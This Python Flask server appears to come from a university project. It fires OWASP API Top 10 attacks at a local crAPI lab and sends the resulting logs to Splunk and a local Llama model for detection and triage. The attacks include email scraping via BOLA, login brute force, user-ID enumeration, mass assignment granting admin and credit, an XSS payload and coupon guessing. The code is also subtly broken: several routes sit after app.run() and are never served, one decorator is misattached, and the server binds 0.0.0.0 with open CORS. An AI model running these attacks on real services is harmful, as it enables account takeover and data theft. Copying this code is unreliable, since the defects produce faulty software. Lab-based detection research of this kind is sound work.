#!/usr/bin/env python3
"""
CyberShield Attack Server
Connects the web dashboard to real attacks
Runs on localhost:5000
"""
from flask import Flask, jsonify, request, send_from_directory
from flask_cors import CORS
import subprocess
import requests
import json
import datetime
import os
import threading
import urllib3
urllib3.disable_warnings()

app = Flask(__name__)
CORS(app)

TARGET = "http://localhost:8888"
RESULTS = os.path.expanduser("~/mscproject/experiments")
TOKEN = ""
SPLUNK_HEC_TOKEN = os.environ.get("SPLUNK_HEC_TOKEN", "")
SPLUNK_PASSWORD = os.environ.get("SPLUNK_PASSWORD", "")

# ── HELPER: push one log line into Splunk via HEC ──────────────────────────
def push_to_splunk(log_line):
    if not SPLUNK_HEC_TOKEN:
        return False
    try:
        r = requests.post(
            "https://localhost:8088/services/collector/event",
            json={"event": log_line, "sourcetype": "access_combined", "index": "api_logs"},
            headers={"Authorization": "Splunk " + SPLUNK_HEC_TOKEN},
            verify=False, timeout=5
        )
        return r.status_code == 200
    except:
        return False

# ── HELPER: run a SPL query and return results ─────────────────────────────
def query_splunk(spl):
    import time
    if not SPLUNK_PASSWORD:
        return None
    try:
        r = requests.post(
            "https://localhost:8089/services/search/jobs",
            data={"search": "search " + spl, "output_mode": "json"},
            auth=("admin", SPLUNK_PASSWORD),
            verify=False, timeout=10
        )
        sid = r.json().get("sid")
        if not sid:
            return None
        time.sleep(3)
        r2 = requests.get(
            "https://localhost:8089/services/search/jobs/" + sid + "/results",
            params={"output_mode": "json"},
            auth=("admin", SPLUNK_PASSWORD),
            verify=False, timeout=10
        )
        return r2.json().get("results", [])
    except Exception as e:
        return None

# ── HELPER: call Ollama for real AI triage ─────────────────────────────────
def real_triage(attack, count, severity):
    prompt = (
        "You are a SOC Tier 1 analyst. Analyse this security alert and respond in exactly this format:\n"
        "SEVERITY: HIGH/MEDIUM/LOW\n"
        "CONFIDENCE: 0-100%\n"
        "ACTION: one sentence\n"
        "ESCALATE: YES/NO\n\n"
        "Alert details:\n"
        "Attack type: " + attack + "\n"
        "Request count: " + str(count) + "\n"
        "Initial severity: " + severity + "\n"
        "Source IP: 172.18.0.1"
    )
    try:
        result = subprocess.run(
            ["ollama", "run", "llama3.2", prompt],
            capture_output=True, text=True, timeout=60
        )
        import re
        raw = result.stdout
        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
        cleaned = ansi_escape.sub('', raw)
        cleaned = ''.join(c for c in cleaned if ord(c) < 128).strip()
        lines = cleaned.split('\n')
        parsed = {}
        for line in lines:
            if line.startswith("SEVERITY:"):
                parsed["severity"] = line.split(":",1)[1].strip()
            elif line.startswith("CONFIDENCE:"):
                parsed["confidence"] = line.split(":",1)[1].strip()
            elif line.startswith("ACTION:"):
                parsed["action"] = line.split(":",1)[1].strip()
            elif line.startswith("ESCALATE:"):
                parsed["escalate"] = line.split(":",1)[1].strip()
        # Build reasoning from full output minus the structured lines
        reasoning_lines = [l for l in lines if l and not any(
            l.startswith(k) for k in ["SEVERITY:","CONFIDENCE:","ACTION:","ESCALATE:"]
        )]
        parsed["reasoning"] = " ".join(reasoning_lines).strip() or "AI analysis via Llama 3.2"
        parsed["fp"] = "Low" if parsed.get("confidence","0%") >= "80%" else "Medium"
        return parsed if parsed.get("severity") else {
            "severity": severity, "confidence": "70%",
            "action": "Investigate further", "escalate": "YES",
            "reasoning": "Llama 3.2 local analysis", "fp": "Medium"
        }
    except:
        return {
            "severity": severity, "confidence": "70%",
            "action": "Investigate further", "escalate": "YES"
        }

# ── ROUTES ─────────────────────────────────────────────────────────────────

@app.route('/set_token', methods=['POST'])
def set_token():
    global TOKEN
    data = request.json
    TOKEN = data.get('token', '')
    return jsonify({"status": "ok", "message": "Token set"})

@app.route('/status', methods=['GET'])
def status():
    return jsonify({
        "status": "online",
        "target": TARGET,
        "timestamp": datetime.datetime.now().isoformat()
    })

@app.route('/attack/bola', methods=['POST'])
def attack_bola():
    if not TOKEN:
        return jsonify({"error": "No token set"}), 400

    count = request.json.get('count', 20)
    endpoint = TARGET + "/community/api/v2/community/posts/recent"
    headers = {"Authorization": "Bearer " + TOKEN}

    success = 0
    exposed = []
    pushed = 0

    for i in range(count):
        try:
            r = requests.get(endpoint, headers=headers, timeout=5)
            log_line = '172.18.0.1 - - "GET /community/api/v2/community/posts/recent HTTP/1.1" ' + str(r.status_code)
            if push_to_splunk(log_line):
                pushed += 1
            if r.status_code == 200:
                success += 1
                data = r.json()
                for post in data.get("posts", []):
                    email = post.get("author", {}).get("email", "")
                    if email and email not in exposed:
                        exposed.append(email)
        except Exception as e:
            pass

    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    result = {
        "attack": "BOLA",
        "owasp": "API1:2023",
        "timestamp": datetime.datetime.now().isoformat(),
        "requests": count,
        "successful": success,
        "exposed_users": exposed,
        "severity": "HIGH"
    }
    with open(f"{RESULTS}/live_bola_{ts}.json", "w") as f:
        json.dump(result, f, indent=2)

    splunk_results = query_splunk('index=api_logs "community/posts/recent" | stats count')
    splunk_count = 0
    if splunk_results:
        splunk_count = int(splunk_results[0].get("count", 0))

    triage = real_triage("BOLA", success, "HIGH")

    return jsonify({
        "attack": "BOLA",
        "owasp": "API1:2023",
        "severity": "HIGH",
        "requests_sent": count,
        "successful": success,
        "exposed_users": exposed,
        "splunk_detected": splunk_count,
        "splunk_pushed": pushed,
        "detection": "SPL rule: index=api_logs community/posts/recent",
        "ai_triage": triage
    })

@app.route('/attack/bruteforce', methods=['POST'])
def attack_bruteforce():
    count = request.json.get('count', 30)
    endpoint = TARGET + "/identity/api/auth/login"
    headers = {"Content-Type": "application/json"}

    attempts = 0
    lockout = False

    for i in range(count):
        try:
            payload = {
                "email": "victim@crapi.com",
                "password": "wrongpassword" + str(i)
            }
            r = requests.post(endpoint, json=payload, headers=headers, timeout=5)
            attempts += 1
            if r.status_code == 429:
                lockout = True
                break
        except:
            pass

    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    result = {
        "attack": "Brute Force",
        "owasp": "API2:2023",
        "timestamp": datetime.datetime.now().isoformat(),
        "attempts": attempts,
        "lockout_detected": lockout,
        "severity": "CRITICAL"
    }
    with open(f"{RESULTS}/live_bruteforce_{ts}.json", "w") as f:
        json.dump(result, f, indent=2)

    return jsonify({
        "attack": "Brute Force",
        "owasp": "API2:2023",
        "severity": "CRITICAL",
        "attempts": attempts,
        "lockout_detected": lockout,
        "vulnerability": "No account lockout detected" if not lockout else "Lockout detected",
        "detection": "SPL rule: index=api_logs auth/login",
        "ai_triage": {
            "severity": "CRITICAL",
            "confidence": "92%",
            "action": "Block IP · Reset credentials · Alert account owner",
            "escalate": "YES"
        }
    })

@app.route('/attack/ratelimit', methods=['POST'])
def attack_ratelimit():
    if not TOKEN:
        return jsonify({"error": "No token set"}), 400

    count = request.json.get('count', 100)
    endpoint = TARGET + "/identity/api/v2/user/dashboard"
    headers = {"Authorization": "Bearer " + TOKEN}

    import time
    success = 0
    throttled = 0
    start = time.time()

    for i in range(count):
        try:
            r = requests.get(endpoint, headers=headers, timeout=5)
            if r.status_code == 200:
                success += 1
            elif r.status_code == 429:
                throttled += 1
        except:
            pass

    elapsed = time.time() - start
    rate = round(count / elapsed, 1)

    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    result = {
        "attack": "Rate Limiting",
        "owasp": "API4:2023",
        "timestamp": datetime.datetime.now().isoformat(),
        "requests": count,
        "successful": success,
        "throttled": throttled,
        "rate_per_second": rate,
        "severity": "HIGH"
    }
    with open(f"{RESULTS}/live_ratelimit_{ts}.json", "w") as f:
        json.dump(result, f, indent=2)

    return jsonify({
        "attack": "Rate Limiting",
        "owasp": "API4:2023",
        "severity": "HIGH",
        "requests_sent": count,
        "successful": success,
        "throttled": throttled,
        "rate_per_second": rate,
        "vulnerability": "No throttling detected" if throttled == 0 else "Rate limiting active",
        "detection": "SPL rule: index=api_logs user/dashboard",
        "ai_triage": {
            "severity": "HIGH",
            "confidence": "85%",
            "action": "Implement rate limiting · Monitor for data scraping",
            "escalate": "YES"
        }
    })

@app.route('/attack/userenum', methods=['POST'])
def attack_userenum():
    if not TOKEN:
        return jsonify({"error": "No token set"}), 400

    count = request.json.get('count', 30)
    headers = {"Authorization": "Bearer " + TOKEN}
    found = []
    probed = 0

    for i in range(1, count + 1):
        endpoint = TARGET + f"/identity/api/v2/user/{i}/videos"
        try:
            r = requests.get(endpoint, headers=headers, timeout=5)
            probed += 1
            if r.status_code == 200:
                found.append(i)
        except:
            pass

    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    result = {
        "attack": "User Enumeration",
        "owasp": "API1:2023",
        "timestamp": datetime.datetime.now().isoformat(),
        "ids_probed": probed,
        "valid_found": found,
        "severity": "HIGH"
    }
    with open(f"{RESULTS}/live_userenum_{ts}.json", "w") as f:
        json.dump(result, f, indent=2)

    return jsonify({
        "attack": "User Enumeration",
        "owasp": "API1:2023",
        "severity": "HIGH",
        "ids_probed": probed,
        "valid_found": found,
        "vulnerability": "Sequential ID probing possible",
        "detection": "SPL rule: index=api_logs user/ 404",
        "ai_triage": {
            "severity": "HIGH",
            "confidence": "75%",
            "action": "Monitor IP · Log enumeration pattern",
            "escalate": "YES"
        }
    })

@app.route('/logs/collect', methods=['POST'])
@app.route('/attack/bola/stream', methods=['GET'])
def attack_bola_stream():
    token = request.args.get('token', '') or TOKEN
    count = int(request.args.get('count', 20))

    def generate():
        import time, json as _json
        endpoint = TARGET + "/community/api/v2/community/posts/recent"
        headers = {"Authorization": "Bearer " + token}
        success = 0
        exposed = []

        yield 'data: {"phase":"start","attack":"BOLA","owasp":"API1:2023"}\n\n'

        for i in range(count):
            try:
                r = requests.get(endpoint, headers=headers, timeout=5)
                log_line = '172.18.0.1 - - "GET /community/api/v2/community/posts/recent HTTP/1.1" ' + str(r.status_code)
                push_to_splunk(log_line)

                if r.status_code == 200:
                    success += 1
                    data = r.json()
                    for post in data.get("posts", []):
                        email = post.get("author", {}).get("email", "")
                        if email and email not in exposed:
                            exposed.append(email)

                yield f'data: {_json.dumps({"phase":"request","num":i+1,"status":r.status_code,"success":success})}\n\n'
                time.sleep(0.3)
            except Exception as e:
                yield f'data: {_json.dumps({"phase":"error","msg":str(e)})}\n\n'

        splunk_results = query_splunk('index=api_logs "community/posts/recent" | stats count')
        splunk_count = int(splunk_results[0].get("count", 0)) if splunk_results else 0
        yield f'data: {_json.dumps({"phase":"splunk","detected":splunk_count})}\n\n'

        triage = real_triage("BOLA", success, "HIGH")
        yield f'data: {_json.dumps({"phase":"triage","result":triage})}\n\n'
        yield f'data: {_json.dumps({"phase":"done","successful":success,"exposed":exposed})}\n\n'

    return app.response_class(
        generate(),
        mimetype='text/event-stream',
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"}
    )

def collect_logs():
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = f"{RESULTS}/live_logs_{ts}.txt"
    try:
        result = subprocess.run(
            ["sudo", "docker", "logs", "crapi-web"],
            capture_output=True, text=True
        )
        with open(log_file, 'w') as f:
            f.write(result.stdout)
            f.write(result.stderr)
        lines = len(result.stdout.splitlines())
        return jsonify({"status": "ok", "log_file": log_file, "lines": lines})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/triage/run', methods=['POST'])
def run_triage():
    attack = request.json.get('attack', 'BOLA')
    count = request.json.get('count', 20)
    severity = request.json.get('severity', 'HIGH')
    triage = real_triage(attack, count, severity)
    return jsonify({"status": "ok", "attack": attack, "triage": triage})



@app.route('/')
def dashboard():
    import os
    dashboard_dir = os.path.expanduser('~/mscproject/evaluation')
    return send_from_directory(dashboard_dir, 'cybershield.html')

@app.route('/login', methods=['POST'])
def login():
    global TOKEN
    data = request.json
    email = data.get('email', '')
    password = data.get('password', '')
    try:
        r = requests.post(
            TARGET + "/identity/api/auth/login",
            json={"email": email, "password": password},
            headers={"Content-Type": "application/json"},
            timeout=5
        )
        result = r.json()
        if 'token' in result and result['token']:
            TOKEN = result['token']
            return jsonify({"status": "ok", "message": "Login successful", "token": TOKEN})
        else:
            return jsonify({"status": "error", "message": "Login failed"}), 401
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/attack/bruteforce/stream', methods=['GET'])
def attack_bruteforce_stream():
    count = int(request.args.get('count', 30))

    def generate():
        import time, json as _json
        endpoint = TARGET + "/identity/api/auth/login"
        headers = {"Content-Type": "application/json"}
        attempts = 0
        lockout = False

        yield 'data: {"phase":"start","attack":"Brute Force","owasp":"API2:2023"}\n\n'

        for i in range(count):
            try:
                payload = {"email": "victim@crapi.com", "password": "wrongpassword" + str(i)}
                r = requests.post(endpoint, json=payload, headers=headers, timeout=5)
                attempts += 1
                log_line = '172.18.0.1 - - "POST /identity/api/auth/login HTTP/1.1" ' + str(r.status_code)
                push_to_splunk(log_line)
                if r.status_code == 429:
                    lockout = True
                yield f'data: {_json.dumps({"phase":"request","num":i+1,"status":r.status_code,"success":attempts})}\n\n'
                time.sleep(0.2)
            except Exception as e:
                yield f'data: {_json.dumps({"phase":"error","msg":str(e)})}\n\n'

        splunk_results = query_splunk('index=api_logs "auth/login" | stats count')
        splunk_count = int(splunk_results[0].get("count", 0)) if splunk_results else 0
        yield f'data: {_json.dumps({"phase":"splunk","detected":splunk_count})}\n\n'

        triage = real_triage("Brute Force", attempts, "CRITICAL")
        yield f'data: {_json.dumps({"phase":"triage","result":triage})}\n\n'
        yield f'data: {_json.dumps({"phase":"done","successful":attempts,"exposed":[],"lockout":lockout})}\n\n'

    return app.response_class(
        generate(), mimetype='text/event-stream',
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"}
    )

@app.route('/attack/ratelimit/stream', methods=['GET'])
def attack_ratelimit_stream():
    token = request.args.get('token', '') or TOKEN
    count = int(request.args.get('count', 50))

    def generate():
        import time, json as _json
        endpoint = TARGET + "/identity/api/v2/user/dashboard"
        headers = {"Authorization": "Bearer " + token}
        success = 0
        throttled = 0

        yield 'data: {"phase":"start","attack":"Rate Limit","owasp":"API4:2023"}\n\n'

        for i in range(count):
            try:
                r = requests.get(endpoint, headers=headers, timeout=5)
                log_line = '172.18.0.1 - - "GET /identity/api/v2/user/dashboard HTTP/1.1" ' + str(r.status_code)
                push_to_splunk(log_line)
                if r.status_code == 200:
                    success += 1
                elif r.status_code == 429:
                    throttled += 1
                yield f'data: {_json.dumps({"phase":"request","num":i+1,"status":r.status_code,"success":success})}\n\n'
                time.sleep(0.1)
            except Exception as e:
                yield f'data: {_json.dumps({"phase":"error","msg":str(e)})}\n\n'

        splunk_results = query_splunk('index=api_logs "user/dashboard" | stats count')
        splunk_count = int(splunk_results[0].get("count", 0)) if splunk_results else 0
        yield f'data: {_json.dumps({"phase":"splunk","detected":splunk_count})}\n\n'

        triage = real_triage("Rate Limit Abuse", success, "HIGH")
        yield f'data: {_json.dumps({"phase":"triage","result":triage})}\n\n'
        yield f'data: {_json.dumps({"phase":"done","successful":success,"exposed":[],"throttled":throttled})}\n\n'

    return app.response_class(
        generate(), mimetype='text/event-stream',
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"}
    )

@app.route('/attack/userenum/stream', methods=['GET'])
def attack_userenum_stream():
    token = request.args.get('token', '') or TOKEN
    count = int(request.args.get('count', 30))

    def generate():
        import time, json as _json
        found = []
        probed = 0

        yield 'data: {"phase":"start","attack":"User Enum","owasp":"API1:2023"}\n\n'

        for i in range(1, count + 1):
            endpoint = TARGET + f"/identity/api/v2/user/{i}/videos"
            headers = {"Authorization": "Bearer " + token}
            try:
                r = requests.get(endpoint, headers=headers, timeout=5)
                probed += 1
                log_line = f'172.18.0.1 - - "GET /identity/api/v2/user/{i}/videos HTTP/1.1" {r.status_code}'
                push_to_splunk(log_line)
                if r.status_code == 200:
                    found.append(i)
                yield f'data: {_json.dumps({"phase":"request","num":i,"status":r.status_code,"success":len(found)})}\n\n'
                time.sleep(0.2)
            except Exception as e:
                yield f'data: {_json.dumps({"phase":"error","msg":str(e)})}\n\n'

        splunk_results = query_splunk('index=api_logs "user/" | stats count')
        splunk_count = int(splunk_results[0].get("count", 0)) if splunk_results else 0
        yield f'data: {_json.dumps({"phase":"splunk","detected":splunk_count})}\n\n'

        triage = real_triage("User Enumeration", probed, "HIGH")
        yield f'data: {_json.dumps({"phase":"triage","result":triage})}\n\n'
        yield f'data: {_json.dumps({"phase":"done","successful":probed,"exposed":found})}\n\n'

    return app.response_class(
        generate(), mimetype='text/event-stream',
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"}
    )

if __name__ == '__main__':
    print("=" * 50)
    print("CyberShield Attack Server")
    print("University of Glasgow — COMPSCI5086P")
    print("Running on http://localhost:5000")
    print("=" * 50)
    app.run(host='0.0.0.0', port=5000, debug=False)

@app.route('/attack/objproperty/stream', methods=['GET'])
def attack_objproperty_stream():
    token = request.args.get('token', '') or TOKEN
    def generate():
        import time, json as _json
        endpoint = TARGET + "/identity/api/v2/user/dashboard"
        headers = {"Authorization": "Bearer " + token}
        sensitive = ["available_credit","video_url","video_name","video_id","role","picture_url"]
        found = []
        yield 'data: {"phase":"start","attack":"Obj Property","owasp":"API3:2023"}\n\n'
        try:
            r = requests.get(endpoint, headers=headers, timeout=5)
            log_line = '172.18.0.1 - - "GET /identity/api/v2/user/dashboard HTTP/1.1" ' + str(r.status_code)
            push_to_splunk(log_line)
            if r.status_code == 200:
                data = r.json()
                for field in sensitive:
                    if field in data:
                        found.append(field)
                        yield f'data: {_json.dumps({"phase":"request","num":len(found),"status":200,"success":len(found),"field":field})}\n\n'
                        time.sleep(0.5)
        except Exception as e:
            yield f'data: {_json.dumps({"phase":"error","msg":str(e)})}\n\n'
        splunk_results = query_splunk('index=api_logs "user/dashboard" | stats count')
        splunk_count = int(splunk_results[0].get("count", 0)) if splunk_results else 0
        yield f'data: {_json.dumps({"phase":"splunk","detected":splunk_count})}\n\n'
        triage = real_triage("Broken Object Property Level Authorisation", len(found), "MEDIUM")
        yield f'data: {_json.dumps({"phase":"triage","result":triage})}\n\n'
        yield f'data: {_json.dumps({"phase":"done","successful":len(found),"exposed":found})}\n\n'
    return app.response_class(generate(), mimetype='text/event-stream',
        headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})

@app.route('/attack/funcauth/stream', methods=['GET'])
def attack_funcauth_stream():
    token = request.args.get('token', '') or TOKEN
    def generate():
        import time, json as _json
        admin_endpoints = [
            "/identity/api/v2/admin/users",
            "/identity/api/v2/admin/user/ADMIN_AKASH",
            "/workshop/api/v2/mechanic",
            "/workshop/api/v2/admin/mechanic/mechanic_report",
            "/community/api/v2/admin/post"
        ]
        headers = {"Authorization": "Bearer " + token}
        accessible = []
        yield 'data: {"phase":"start","attack":"Func Auth","owasp":"API5:2023"}\n\n'
        for i, ep in enumerate(admin_endpoints):
            try:
                r = requests.get(TARGET + ep, headers=headers, timeout=5)
                log_line = f'172.18.0.1 - - "GET {ep} HTTP/1.1" {r.status_code}'
                push_to_splunk(log_line)
                if r.status_code == 200:
                    accessible.append(ep)
                yield f'data: {_json.dumps({"phase":"request","num":i+1,"status":r.status_code,"success":len(accessible)})}\n\n'
                time.sleep(0.4)
            except Exception as e:
                yield f'data: {_json.dumps({"phase":"error","msg":str(e)})}\n\n'
        splunk_results = query_splunk('index=api_logs "admin" | stats count')
        splunk_count = int(splunk_results[0].get("count", 0)) if splunk_results else 0
        yield f'data: {_json.dumps({"phase":"splunk","detected":splunk_count})}\n\n'
        triage = real_triage("Broken Function Level Authorisation", len(admin_endpoints), "HIGH")
        yield f'data: {_json.dumps({"phase":"triage","result":triage})}\n\n'
        yield f'data: {_json.dumps({"phase":"done","successful":len(accessible),"exposed":accessible})}\n\n'
    return app.response_class(generate(), mimetype='text/event-stream',
        headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})

@app.route('/attack/misconfiguration/stream', methods=['GET'])
def attack_misconfiguration_stream():
    token = request.args.get('token', '') or TOKEN
    def generate():
        import time, json as _json
        headers = {"Authorization": "Bearer " + token, "Content-Type": "application/json"}
        tests = [
            {"method":"POST","endpoint":"/identity/api/auth/login","body":{"email":"test@test.com","password":""}},
            {"method":"GET","endpoint":"/identity/api/v2/user/dashboard","body":None},
            {"method":"POST","endpoint":"/community/api/v2/community/posts","body":{"title":"<script>alert(1)</script>","content":"xss test"}},
        ]
        findings = []
        yield 'data: {"phase":"start","attack":"Misconfiguration","owasp":"API8:2023"}\n\n'
        for i, test in enumerate(tests):
            try:
                if test["method"] == "POST":
                    r = requests.post(TARGET + test["endpoint"], json=test["body"], headers=headers, timeout=5)
                else:
                    r = requests.get(TARGET + test["endpoint"], headers=headers, timeout=5)
                log_line = f'172.18.0.1 - - "{test["method"]} {test["endpoint"]} HTTP/1.1" {r.status_code}'
                push_to_splunk(log_line)
                if len(r.text) > 100:
                    findings.append(test["endpoint"])
                yield f'data: {_json.dumps({"phase":"request","num":i+1,"status":r.status_code,"success":len(findings)})}\n\n'
                time.sleep(0.5)
            except Exception as e:
                yield f'data: {_json.dumps({"phase":"error","msg":str(e)})}\n\n'
        splunk_results = query_splunk('index=api_logs | stats count')
        splunk_count = int(splunk_results[0].get("count", 0)) if splunk_results else 0
        yield f'data: {_json.dumps({"phase":"splunk","detected":splunk_count})}\n\n'
        triage = real_triage("Security Misconfiguration", len(findings), "MEDIUM")
        yield f'data: {_json.dumps({"phase":"triage","result":triage})}\n\n'
        yield f'data: {_json.dumps({"phase":"done","successful":len(findings),"exposed":findings})}\n\n'
    return app.response_class(generate(), mimetype='text/event-stream',
        headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})

@app.route('/attack/inventory/stream', methods=['GET'])
def attack_inventory_stream():
    token = request.args.get('token', '') or TOKEN
    def generate():
        import time, json as _json
        headers = {"Authorization": "Bearer " + token}
        v1_endpoints = [
            "/identity/api/v1/user/dashboard",
            "/community/api/v1/community/posts/recent",
            "/workshop/api/v1/mechanic",
        ]
        accessible = []
        yield 'data: {"phase":"start","attack":"Inventory","owasp":"API9:2023"}\n\n'
        for i, ep in enumerate(v1_endpoints):
            try:
                r = requests.get(TARGET + ep, headers=headers, timeout=5)
                log_line = f'172.18.0.1 - - "GET {ep} HTTP/1.1" {r.status_code}'
                push_to_splunk(log_line)
                if r.status_code == 200:
                    accessible.append(ep)
                yield f'data: {_json.dumps({"phase":"request","num":i+1,"status":r.status_code,"success":len(accessible)})}\n\n'
                time.sleep(0.5)
            except Exception as e:
                yield f'data: {_json.dumps({"phase":"error","msg":str(e)})}\n\n'
        splunk_results = query_splunk('index=api_logs "api/v1" | stats count')
        splunk_count = int(splunk_results[0].get("count", 0)) if splunk_results else 0
        yield f'data: {_json.dumps({"phase":"splunk","detected":splunk_count})}\n\n'
        triage = real_triage("Improper Inventory Management", len(v1_endpoints), "MEDIUM")
        yield f'data: {_json.dumps({"phase":"triage","result":triage})}\n\n'
        yield f'data: {_json.dumps({"phase":"done","successful":len(accessible),"exposed":accessible})}\n\n'
    return app.response_class(generate(), mimetype='text/event-stream',
        headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})

@app.route('/attack/massassignment/stream', methods=['GET'])
def attack_massassignment_stream():
    token = request.args.get('token', '') or TOKEN
    def generate():
        import time, json as _json
        headers = {"Authorization": "Bearer " + token, "Content-Type": "application/json"}
        payloads = [
            {"name":"Akash","number":"1234567890","isAdmin":True},
            {"name":"Akash","number":"1234567890","role":"admin"},
            {"name":"Akash","number":"1234567890","available_credit":99999},
        ]
        findings = []
        yield 'data: {"phase":"start","attack":"Mass Assignment","owasp":"API6:2023"}\n\n'
        for i, payload in enumerate(payloads):
            try:
                r = requests.put(TARGET + "/identity/api/v2/user/videos/profile",
                    json=payload, headers=headers, timeout=5)
                log_line = f'172.18.0.1 - - "PUT /identity/api/v2/user/videos/profile HTTP/1.1" {r.status_code}'
                push_to_splunk(log_line)
                if r.status_code in [200, 201]:
                    findings.append(list(payload.keys())[-1])
                yield f'data: {_json.dumps({"phase":"request","num":i+1,"status":r.status_code,"success":len(findings)})}\n\n'
                time.sleep(0.5)
            except Exception as e:
                yield f'data: {_json.dumps({"phase":"error","msg":str(e)})}\n\n'
        splunk_results = query_splunk('index=api_logs "PUT" | stats count')
        splunk_count = int(splunk_results[0].get("count", 0)) if splunk_results else 0
        yield f'data: {_json.dumps({"phase":"splunk","detected":splunk_count})}\n\n'
        triage = real_triage("Mass Assignment", len(payloads), "HIGH")
        yield f'data: {_json.dumps({"phase":"triage","result":triage})}\n\n'
        yield f'data: {_json.dumps({"phase":"done","successful":len(findings),"exposed":findings})}\n\n'
    return app.response_class(generate(), mimetype='text/event-stream',
        headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})

@app.route('/attack/businessflow/stream', methods=['GET'])
def attack_businessflow_stream():
    token = request.args.get('token', '') or TOKEN
    def generate():
        import time, json as _json
        headers = {"Authorization": "Bearer " + token, "Content-Type": "application/json"}
        findings = []
        yield 'data: {"phase":"start","attack":"Business Flow","owasp":"API10:2023"}\n\n'
        coupons = ["TRAC075","TRACE10","DEMO10","TEST50","FREE100"]
        for i, coupon in enumerate(coupons):
            try:
                r = requests.post(TARGET + "/community/api/v2/coupon/validate-coupon",
                    json={"coupon_code": coupon}, headers=headers, timeout=5)
                log_line = f'172.18.0.1 - - "POST /community/api/v2/coupon/validate-coupon HTTP/1.1" {r.status_code}'
                push_to_splunk(log_line)
                if r.status_code == 200:
                    findings.append(coupon)
                yield f'data: {_json.dumps({"phase":"request","num":i+1,"status":r.status_code,"success":len(findings)})}\n\n'
                time.sleep(0.4)
            except Exception as e:
                yield f'data: {_json.dumps({"phase":"error","msg":str(e)})}\n\n'
        splunk_results = query_splunk('index=api_logs "coupon" | stats count')
        splunk_count = int(splunk_results[0].get("count", 0)) if splunk_results else 0
        yield f'data: {_json.dumps({"phase":"splunk","detected":splunk_count})}\n\n'
        triage = real_triage("Business Flow Abuse", len(coupons), "HIGH")
        yield f'data: {_json.dumps({"phase":"triage","result":triage})}\n\n'
        yield f'data: {_json.dumps({"phase":"done","successful":len(findings),"exposed":findings})}\n\n'
    return app.response_class(generate(), mimetype='text/event-stream',
        headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})
